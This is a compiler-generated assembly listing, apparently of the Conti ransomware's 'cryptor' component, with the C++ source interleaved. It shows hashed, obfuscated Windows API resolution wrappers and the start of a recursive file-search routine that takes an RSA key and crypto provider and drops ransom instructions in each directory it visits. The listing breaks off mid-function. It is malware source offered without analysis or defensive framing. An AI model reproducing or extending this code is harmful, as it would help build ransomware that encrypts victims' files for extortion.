;	COMDAT ?pFindClose@@YAHPEAX@Z
_TEXT	SEGMENT
pFunction$ = 8
hFindFile$ = 256
?pFindClose@@YAHPEAX@Z PROC				; pFindClose, COMDAT

; 541  : {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__9B49ECA4_getapi@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 542  : 	BOOL(WINAPI * pFunction)(HANDLE);
; 543  : 	pFunction = (BOOL(WINAPI*)(HANDLE))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x013ee65d, 61);//GetProcAddress(hKernel32, OBFA("FindClose"));

  0001f	41 b9 3d 00 00
	00		 mov	 r9d, 61			; 0000003dH
  00025	41 b8 5d e6 3e
	01		 mov	 r8d, 20899421		; 013ee65dH
  0002b	ba 0f 00 00 00	 mov	 edx, 15
  00030	33 c9		 xor	 ecx, ecx
  00032	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
  00037	48 89 45 08	 mov	 QWORD PTR pFunction$[rbp], rax

; 544  : 	return pFunction(hFindFile);

  0003b	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR hFindFile$[rbp]
  00042	ff 55 08	 call	 QWORD PTR pFunction$[rbp]

; 545  : }

  00045	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  0004c	5f		 pop	 rdi
  0004d	5d		 pop	 rbp
  0004e	c3		 ret	 0
?pFindClose@@YAHPEAX@Z ENDP				; pFindClose
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pFindNextFileW@@YAHPEAXPEAU_WIN32_FIND_DATAW@@@Z
_TEXT	SEGMENT
pFunction$ = 8
hFindFile$ = 256
lpFindFileData$ = 264
?pFindNextFileW@@YAHPEAXPEAU_WIN32_FIND_DATAW@@@Z PROC	; pFindNextFileW, COMDAT

; 532  : {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__9B49ECA4_getapi@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 533  : 	BOOL(WINAPI * pFunction)(HANDLE, LPWIN32_FIND_DATAW);
; 534  : 	pFunction = (BOOL(WINAPI*)(HANDLE, LPWIN32_FIND_DATAW))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xff036af1, 62);//GetProcAddress(hKernel32, OBFA("FindNextFileW"));

  00024	41 b9 3e 00 00
	00		 mov	 r9d, 62			; 0000003eH
  0002a	41 b8 f1 6a 03
	ff		 mov	 r8d, -16553231		; ff036af1H
  00030	ba 0f 00 00 00	 mov	 edx, 15
  00035	33 c9		 xor	 ecx, ecx
  00037	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
  0003c	48 89 45 08	 mov	 QWORD PTR pFunction$[rbp], rax

; 535  : 	return pFunction(hFindFile, lpFindFileData);

  00040	48 8b 95 08 01
	00 00		 mov	 rdx, QWORD PTR lpFindFileData$[rbp]
  00047	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR hFindFile$[rbp]
  0004e	ff 55 08	 call	 QWORD PTR pFunction$[rbp]

; 536  : }

  00051	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00058	5f		 pop	 rdi
  00059	5d		 pop	 rbp
  0005a	c3		 ret	 0
?pFindNextFileW@@YAHPEAXPEAU_WIN32_FIND_DATAW@@@Z ENDP	; pFindNextFileW
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pFindFirstFileW@@YAPEAXPEB_WPEAU_WIN32_FIND_DATAW@@@Z
_TEXT	SEGMENT
pFunction$ = 8
lpFileName$ = 256
lpFindFileData$ = 264
?pFindFirstFileW@@YAPEAXPEB_WPEAU_WIN32_FIND_DATAW@@@Z PROC ; pFindFirstFileW, COMDAT

; 522  : {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__9B49ECA4_getapi@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 523  : 	HANDLE(WINAPI * pFunction)(LPCWSTR, LPWIN32_FIND_DATAW);
; 524  : 	pFunction = (HANDLE(WINAPI*)(LPCWSTR, LPWIN32_FIND_DATAW))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x4796a6c5, 63);//GetProcAddress(hKernel32, OBFA("FindFirstFileW"));

  00024	41 b9 3f 00 00
	00		 mov	 r9d, 63			; 0000003fH
  0002a	41 b8 c5 a6 96
	47		 mov	 r8d, 1201055429		; 4796a6c5H
  00030	ba 0f 00 00 00	 mov	 edx, 15
  00035	33 c9		 xor	 ecx, ecx
  00037	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
  0003c	48 89 45 08	 mov	 QWORD PTR pFunction$[rbp], rax

; 525  : 	return pFunction(lpFileName, lpFindFileData);

  00040	48 8b 95 08 01
	00 00		 mov	 rdx, QWORD PTR lpFindFileData$[rbp]
  00047	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR lpFileName$[rbp]
  0004e	ff 55 08	 call	 QWORD PTR pFunction$[rbp]

; 526  : }

  00051	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00058	5f		 pop	 rdi
  00059	5d		 pop	 rbp
  0005a	c3		 ret	 0
?pFindFirstFileW@@YAPEAXPEB_WPEAU_WIN32_FIND_DATAW@@@Z ENDP ; pFindFirstFileW
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pCloseHandle@@YAHPEAX@Z
_TEXT	SEGMENT
pFunction$ = 8
hObject$ = 256
?pCloseHandle@@YAHPEAX@Z PROC				; pCloseHandle, COMDAT

; 226  : {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__9B49ECA4_getapi@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 227  : 	BOOL(WINAPI * pFunction)(HANDLE);
; 228  : 	pFunction = (BOOL(WINAPI*)(HANDLE))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xca528872, 91);//GetProcAddress(hKernel32, OBFA("CloseHandle"));

  0001f	41 b9 5b 00 00
	00		 mov	 r9d, 91			; 0000005bH
  00025	41 b8 72 88 52
	ca		 mov	 r8d, -900560782		; ca528872H
  0002b	ba 0f 00 00 00	 mov	 edx, 15
  00030	33 c9		 xor	 ecx, ecx
  00032	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
  00037	48 89 45 08	 mov	 QWORD PTR pFunction$[rbp], rax

; 229  : 	return pFunction(hObject);

  0003b	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR hObject$[rbp]
  00042	ff 55 08	 call	 QWORD PTR pFunction$[rbp]

; 230  : }

  00045	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  0004c	5f		 pop	 rdi
  0004d	5d		 pop	 rbp
  0004e	c3		 ret	 0
?pCloseHandle@@YAHPEAX@Z ENDP				; pCloseHandle
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pGetLastError@@YAKXZ
_TEXT	SEGMENT
pFunction$ = 8
?pGetLastError@@YAKXZ PROC				; pGetLastError, COMDAT

; 207  : {

$LN3:
  00000	40 55		 push	 rbp
  00002	57		 push	 rdi
  00003	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000a	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0000f	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__9B49ECA4_getapi@h
  00016	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 208  : 	DWORD(WINAPI * pFunction)();
; 209  : 	pFunction = (DWORD(WINAPI*)())getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x9aab3800, 93);//GetProcAddress(hKernel32, OBFA("GetLastError"));

  0001b	41 b9 5d 00 00
	00		 mov	 r9d, 93			; 0000005dH
  00021	41 b8 00 38 ab
	9a		 mov	 r8d, -1700055040	; 9aab3800H
  00027	ba 0f 00 00 00	 mov	 edx, 15
  0002c	33 c9		 xor	 ecx, ecx
  0002e	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
  00033	48 89 45 08	 mov	 QWORD PTR pFunction$[rbp], rax

; 210  : 	return pFunction();

  00037	ff 55 08	 call	 QWORD PTR pFunction$[rbp]

; 211  : }

  0003a	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
?pGetLastError@@YAKXZ ENDP				; pGetLastError
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pCreateFileW@@YAPEAXPEB_WKKPEAU_SECURITY_ATTRIBUTES@@KKPEAX@Z
_TEXT	SEGMENT
pFunction$ = 8
lpFileName$ = 256
dwDesiredAccess$ = 264
dwShareMode$ = 272
lpSecurityAttributes$ = 280
dwCreationDisposition$ = 288
dwFlagsAndAttributes$ = 296
hTemplateFile$ = 304
?pCreateFileW@@YAPEAXPEB_WKKPEAU_SECURITY_ATTRIBUTES@@KKPEAX@Z PROC ; pCreateFileW, COMDAT

; 172  : {

$LN3:
  00000	4c 89 4c 24 20	 mov	 QWORD PTR [rsp+32], r9
  00005	44 89 44 24 18	 mov	 DWORD PTR [rsp+24], r8d
  0000a	89 54 24 10	 mov	 DWORD PTR [rsp+16], edx
  0000e	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00013	55		 push	 rbp
  00014	57		 push	 rdi
  00015	48 81 ec 28 01
	00 00		 sub	 rsp, 296		; 00000128H
  0001c	48 8d 6c 24 40	 lea	 rbp, QWORD PTR [rsp+64]
  00021	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__9B49ECA4_getapi@h
  00028	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 173  : 	HANDLE(WINAPI * pFunction)(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
; 174  : 	pFunction = (HANDLE(WINAPI*)(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x017610e8, 97);//GetProcAddress(hKernel32, OBFA("CreateFileW"));

  0002d	41 b9 61 00 00
	00		 mov	 r9d, 97			; 00000061H
  00033	41 b8 e8 10 76
	01		 mov	 r8d, 24514792		; 017610e8H
  00039	ba 0f 00 00 00	 mov	 edx, 15
  0003e	33 c9		 xor	 ecx, ecx
  00040	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
  00045	48 89 45 08	 mov	 QWORD PTR pFunction$[rbp], rax

; 175  : 	return pFunction(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);

  00049	48 8b 85 30 01
	00 00		 mov	 rax, QWORD PTR hTemplateFile$[rbp]
  00050	48 89 44 24 30	 mov	 QWORD PTR [rsp+48], rax
  00055	8b 85 28 01 00
	00		 mov	 eax, DWORD PTR dwFlagsAndAttributes$[rbp]
  0005b	89 44 24 28	 mov	 DWORD PTR [rsp+40], eax
  0005f	8b 85 20 01 00
	00		 mov	 eax, DWORD PTR dwCreationDisposition$[rbp]
  00065	89 44 24 20	 mov	 DWORD PTR [rsp+32], eax
  00069	4c 8b 8d 18 01
	00 00		 mov	 r9, QWORD PTR lpSecurityAttributes$[rbp]
  00070	44 8b 85 10 01
	00 00		 mov	 r8d, DWORD PTR dwShareMode$[rbp]
  00077	8b 95 08 01 00
	00		 mov	 edx, DWORD PTR dwDesiredAccess$[rbp]
  0007d	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR lpFileName$[rbp]
  00084	ff 55 08	 call	 QWORD PTR pFunction$[rbp]

; 176  : }

  00087	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  0008e	5f		 pop	 rdi
  0008f	5d		 pop	 rbp
  00090	c3		 ret	 0
?pCreateFileW@@YAPEAXPEB_WKKPEAU_SECURITY_ATTRIBUTES@@KKPEAX@Z ENDP ; pCreateFileW
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pWriteFile@@YAHPEAXPEBXKPEAKPEAU_OVERLAPPED@@@Z
_TEXT	SEGMENT
pFunction$ = 8
hFile$ = 256
lpBuffer$ = 264
nNumberOfBytesToWrite$ = 272
lpNumberOfBytesWritten$ = 280
lpOverlapped$ = 288
?pWriteFile@@YAHPEAXPEBXKPEAKPEAU_OVERLAPPED@@@Z PROC	; pWriteFile, COMDAT

; 120  : {

$LN3:
  00000	4c 89 4c 24 20	 mov	 QWORD PTR [rsp+32], r9
  00005	44 89 44 24 18	 mov	 DWORD PTR [rsp+24], r8d
  0000a	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  0000f	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00014	55		 push	 rbp
  00015	57		 push	 rdi
  00016	48 81 ec 18 01
	00 00		 sub	 rsp, 280		; 00000118H
  0001d	48 8d 6c 24 30	 lea	 rbp, QWORD PTR [rsp+48]
  00022	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__9B49ECA4_getapi@h
  00029	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 121  : 	BOOL(WINAPI * pFunction)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
; 122  : 	pFunction = (BOOL(WINAPI*)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x088f1e18, 102);//GetProcAddress(hKernel32, OBFA("WriteFile"));

  0002e	41 b9 66 00 00
	00		 mov	 r9d, 102		; 00000066H
  00034	41 b8 18 1e 8f
	08		 mov	 r8d, 143597080		; 088f1e18H
  0003a	ba 0f 00 00 00	 mov	 edx, 15
  0003f	33 c9		 xor	 ecx, ecx
  00041	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
  00046	48 89 45 08	 mov	 QWORD PTR pFunction$[rbp], rax

; 123  : 	return pFunction(hFile, lpBuffer, nNumberOfBytesToWrite, lpNumberOfBytesWritten, lpOverlapped);

  0004a	48 8b 85 20 01
	00 00		 mov	 rax, QWORD PTR lpOverlapped$[rbp]
  00051	48 89 44 24 20	 mov	 QWORD PTR [rsp+32], rax
  00056	4c 8b 8d 18 01
	00 00		 mov	 r9, QWORD PTR lpNumberOfBytesWritten$[rbp]
  0005d	44 8b 85 10 01
	00 00		 mov	 r8d, DWORD PTR nNumberOfBytesToWrite$[rbp]
  00064	48 8b 95 08 01
	00 00		 mov	 rdx, QWORD PTR lpBuffer$[rbp]
  0006b	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR hFile$[rbp]
  00072	ff 55 08	 call	 QWORD PTR pFunction$[rbp]

; 124  : }

  00075	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  0007c	5f		 pop	 rdi
  0007d	5d		 pop	 rbp
  0007e	c3		 ret	 0
?pWriteFile@@YAHPEAXPEBXKPEAKPEAU_OVERLAPPED@@@Z ENDP	; pWriteFile
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
;	COMDAT ?SearchFiles@filesystem@@YAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@_K1PEAE@Z
_TEXT	SEGMENT
DirectoryList$ = 8
StartDirectoryInfo$ = 56
FindData$10 = 96
DirectoryInfo$11 = 712
CurrentDirectory$12 = 744
SearchMask$13 = 808
hSearchFile$14 = 872
Directory$15 = 904
DirectoryInfo$16 = 968
Filename$17 = 1000
FileInfo$18 = 1072
$T19 = 2904
$T20 = 2936
$T21 = 3000
$T22 = 3032
$T23 = 3096
$T24 = 3136
$T25 = 3288
$T26 = 3316
$T27 = 3348
$T28 = 3384
$T29 = 3448
$T30 = 3480
$T31 = 3544
$T32 = 3576
$T33 = 3608
$T34 = 3672
$T35 = 3704
$T36 = 3768
$T37 = 3800
tv152 = 3812
tv339 = 3816
tv289 = 3816
tv239 = 3816
tv214 = 3816
tv184 = 3816
tv155 = 3816
tv74 = 3816
__$ArrayPad$ = 3824
StartDirectory$ = 3872
CryptoProvider$ = 3880
RsaKey$ = 3888
Buffer$ = 3896
?SearchFiles@filesystem@@YAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@_K1PEAE@Z PROC ; filesystem::SearchFiles, COMDAT

; 161  : {

$LN44:
  00000	4c 89 4c 24 20	 mov	 QWORD PTR [rsp+32], r9
  00005	4c 89 44 24 18	 mov	 QWORD PTR [rsp+24], r8
  0000a	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  0000f	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00014	55		 push	 rbp
  00015	57		 push	 rdi
  00016	48 81 ec 28 0f
	00 00		 sub	 rsp, 3880		; 00000f28H
  0001d	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00022	48 8d 7c 24 20	 lea	 rdi, QWORD PTR [rsp+32]
  00027	b9 a2 02 00 00	 mov	 ecx, 674		; 000002a2H
  0002c	b8 cc cc cc cc	 mov	 eax, -858993460		; ccccccccH
  00031	f3 ab		 rep stosd
  00033	48 8b 8c 24 48
	0f 00 00	 mov	 rcx, QWORD PTR [rsp+3912]
  0003b	48 8b 05 00 00
	00 00		 mov	 rax, QWORD PTR __security_cookie
  00042	48 33 c5	 xor	 rax, rbp
  00045	48 89 85 f0 0e
	00 00		 mov	 QWORD PTR __$ArrayPad$[rbp], rax
  0004c	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__A3B0747C_search@cpp
  00053	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode
$LN4@SearchFile:

; 162  : 	TAILQ_HEAD(, directory_info_) DirectoryList;
; 163  : 	TAILQ_INIT(&DirectoryList);

  00058	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR DirectoryList$[rbp], 0
  00060	48 8d 45 08	 lea	 rax, QWORD PTR DirectoryList$[rbp]
  00064	48 89 45 10	 mov	 QWORD PTR DirectoryList$[rbp+8], rax
  00068	33 c0		 xor	 eax, eax
  0006a	85 c0		 test	 eax, eax
  0006c	75 ea		 jne	 SHORT $LN4@SearchFile

; 164  : 
; 165  : 	PDIRECTORY_INFO StartDirectoryInfo = new DIRECTORY_INFO;

  0006e	b9 30 00 00 00	 mov	 ecx, 48			; 00000030H
  00073	e8 00 00 00 00	 call	 ??2@YAPEAX_K@Z		; operator new
  00078	48 89 85 58 0b
	00 00		 mov	 QWORD PTR $T19[rbp], rax
  0007f	48 83 bd 58 0b
	00 00 00	 cmp	 QWORD PTR $T19[rbp], 0
  00087	74 15		 je	 SHORT $LN35@SearchFile
  00089	48 8b 8d 58 0b
	00 00		 mov	 rcx, QWORD PTR $T19[rbp]
  00090	e8 00 00 00 00	 call	 ??0directory_info_@@QEAA@XZ
  00095	48 89 85 e8 0e
	00 00		 mov	 QWORD PTR tv74[rbp], rax
  0009c	eb 0b		 jmp	 SHORT $LN36@SearchFile
$LN35@SearchFile:
  0009e	48 c7 85 e8 0e
	00 00 00 00 00
	00		 mov	 QWORD PTR tv74[rbp], 0
$LN36@SearchFile:
  000a9	48 8b 85 e8 0e
	00 00		 mov	 rax, QWORD PTR tv74[rbp]
  000b0	48 89 45 38	 mov	 QWORD PTR StartDirectoryInfo$[rbp], rax

; 166  : 	if (!StartDirectoryInfo) {

  000b4	48 83 7d 38 00	 cmp	 QWORD PTR StartDirectoryInfo$[rbp], 0
  000b9	75 11		 jne	 SHORT $LN22@SearchFile

; 167  : 		return;

  000bb	48 8b 8d 20 0f
	00 00		 mov	 rcx, QWORD PTR StartDirectory$[rbp]
  000c2	e8 00 00 00 00	 call	 ??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::~basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
  000c7	e9 5a 05 00 00	 jmp	 $LN1@SearchFile
$LN22@SearchFile:

; 168  : 	}
; 169  : 
; 170  : 	StartDirectoryInfo->Directory = StartDirectory;

  000cc	48 8b 45 38	 mov	 rax, QWORD PTR StartDirectoryInfo$[rbp]
  000d0	48 8b 95 20 0f
	00 00		 mov	 rdx, QWORD PTR StartDirectory$[rbp]
  000d7	48 8b c8	 mov	 rcx, rax
  000da	e8 00 00 00 00	 call	 ??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV01@AEBV01@@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::operator=
$LN7@SearchFile:

; 171  : 	TAILQ_INSERT_TAIL(&DirectoryList, StartDirectoryInfo, Entries);

  000df	48 8b 45 38	 mov	 rax, QWORD PTR StartDirectoryInfo$[rbp]
  000e3	48 c7 40 20 00
	00 00 00	 mov	 QWORD PTR [rax+32], 0
  000eb	48 8b 45 38	 mov	 rax, QWORD PTR StartDirectoryInfo$[rbp]
  000ef	48 8b 4d 10	 mov	 rcx, QWORD PTR DirectoryList$[rbp+8]
  000f3	48 89 48 28	 mov	 QWORD PTR [rax+40], rcx
  000f7	48 8b 45 10	 mov	 rax, QWORD PTR DirectoryList$[rbp+8]
  000fb	48 8b 4d 38	 mov	 rcx, QWORD PTR StartDirectoryInfo$[rbp]
  000ff	48 89 08	 mov	 QWORD PTR [rax], rcx
  00102	48 8b 45 38	 mov	 rax, QWORD PTR StartDirectoryInfo$[rbp]
  00106	48 83 c0 20	 add	 rax, 32			; 00000020H
  0010a	48 89 45 10	 mov	 QWORD PTR DirectoryList$[rbp+8], rax
  0010e	33 c0		 xor	 eax, eax
  00110	85 c0		 test	 eax, eax
  00112	75 cb		 jne	 SHORT $LN7@SearchFile
$LN8@SearchFile:

; 172  : 
; 173  : 	while (!TAILQ_EMPTY(&DirectoryList)) {

  00114	48 83 7d 08 00	 cmp	 QWORD PTR DirectoryList$[rbp], 0
  00119	0f 84 fb 04 00
	00		 je	 $LN9@SearchFile

; 174  : 
; 175  : 		WIN32_FIND_DATAW FindData;
; 176  : 		PDIRECTORY_INFO DirectoryInfo = TAILQ_FIRST(&DirectoryList);

  0011f	48 8b 45 08	 mov	 rax, QWORD PTR DirectoryList$[rbp]
  00123	48 89 85 c8 02
	00 00		 mov	 QWORD PTR DirectoryInfo$11[rbp], rax

; 177  : 		if (DirectoryInfo == NULL) {

  0012a	48 83 bd c8 02
	00 00 00	 cmp	 QWORD PTR DirectoryInfo$11[rbp], 0
  00132	75 05		 jne	 SHORT $LN23@SearchFile

; 178  : 			break;

  00134	e9 e1 04 00 00	 jmp	 $LN9@SearchFile
$LN23@SearchFile:

; 179  : 		}
; 180  : 
; 181  : 		std::wstring CurrentDirectory = DirectoryInfo->Directory;

  00139	48 8b 85 c8 02
	00 00		 mov	 rax, QWORD PTR DirectoryInfo$11[rbp]
  00140	48 8b d0	 mov	 rdx, rax
  00143	48 8d 8d e8 02
	00 00		 lea	 rcx, QWORD PTR CurrentDirectory$12[rbp]
  0014a	e8 00 00 00 00	 call	 ??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@AEBV01@@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >

; 182  : 		std::wstring SearchMask = MakeSearchMask(CurrentDirectory);

  0014f	48 8d 85 78 0b
	00 00		 lea	 rax, QWORD PTR $T20[rbp]
  00156	48 89 85 b8 0b
	00 00		 mov	 QWORD PTR $T21[rbp], rax
  0015d	48 8d 95 e8 02
	00 00		 lea	 rdx, QWORD PTR CurrentDirectory$12[rbp]
  00164	48 8b 8d b8 0b
	00 00		 mov	 rcx, QWORD PTR $T21[rbp]
  0016b	e8 00 00 00 00	 call	 ??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@AEBV01@@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
  00170	48 8b d0	 mov	 rdx, rax
  00173	48 8d 8d 28 03
	00 00		 lea	 rcx, QWORD PTR SearchMask$13[rbp]
  0017a	e8 00 00 00 00	 call	 ?MakeSearchMask@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@V12@@Z ; MakeSearchMask

; 183  : 
; 184  : 		DropInstruction(CurrentDirectory);

  0017f	48 8d 85 d8 0b
	00 00		 lea	 rax, QWORD PTR $T22[rbp]
  00186	48 89 85 18 0c
	00 00		 mov	 QWORD PTR $T23[rbp], rax
  0018d	48 8d 95 e8 02
	00 00		 lea	 rdx, QWORD PTR CurrentDirectory$12[rbp]
  00194	48 8b 8d 18 0c
	00 00		 mov	 rcx, QWORD PTR $T23[rbp]
  0019b	e8 00 00 00 00	 call	 ??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@AEBV01@@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
  001a0	48 8b c8	 mov	 rcx, rax
  001a3	e8 00 00 00 00	 call	 ?DropInstruction@@YAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z ; DropInstruction

; 185  : 
; 186  : 		HANDLE hSearchFile = pFindFirstFileW(SearchMask.c_str(), &FindData);

  001a8	48 8d 8d 28 03
	00 00		 lea	 rcx, QWORD PTR SearchMask$13[rbp]
  001af	e8 00 00 00 00	 call	 ?c_str@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBAPEB_WXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::c_str
  001b4	48 8d 55 60	 lea	 rdx, QWORD PTR FindData$10[rbp]
  001b8	48 8b c8	 mov	 rcx, rax
  001bb	e8 00 00 00 00	 call	 ?pFindFirstFileW@@YAPEAXPEB_WPEAU_WIN32_FIND_DATAW@@@Z ; pFindFirstFileW
  001c0	48 89 85 68 03
	00 00		 mov	 QWORD PTR hSearchFile$14[rbp], rax

; 187  : 		if (hSearchFile == INVALID_HANDLE_VALUE) {

  001c7	48 83 bd 68 03
	00 00 ff	 cmp	 QWORD PTR hSearchFile$14[rbp], -1
  001cf	0f 85 06 01 00
	00		 jne	 $LN15@SearchFile

; 188  : 
; 189  : 			logs::Write(OBFW(L"FindFirstFile fails in directory %s. GetLastError = %lu."), CurrentDirectory.c_str(), pGetLastError());

  001d5	e8 00 00 00 00	 call	 ?pGetLastError@@YAKXZ	; pGetLastError
  001da	89 85 e4 0e 00
	00		 mov	 DWORD PTR tv152[rbp], eax
  001e0	48 8d 8d e8 02
	00 00		 lea	 rcx, QWORD PTR CurrentDirectory$12[rbp]
